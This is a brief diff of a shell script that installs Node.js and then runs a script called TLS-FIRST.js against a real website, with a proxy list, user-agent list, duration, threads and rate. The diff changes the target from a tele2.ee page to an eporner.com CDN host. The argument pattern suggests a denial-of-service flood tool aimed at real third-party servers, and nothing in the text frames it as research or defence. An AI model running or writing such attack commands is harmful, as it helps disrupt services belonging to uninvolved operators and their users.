@@ -6,4 +6,4 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://tele2.ee/ru/ettevottest 3000 proxy.txt ua.txt 12 100
+node TLS-FIRST.js https://s2-n10-nl-cdn.eporner.com 3000 proxy.txt ua.txt 12 100
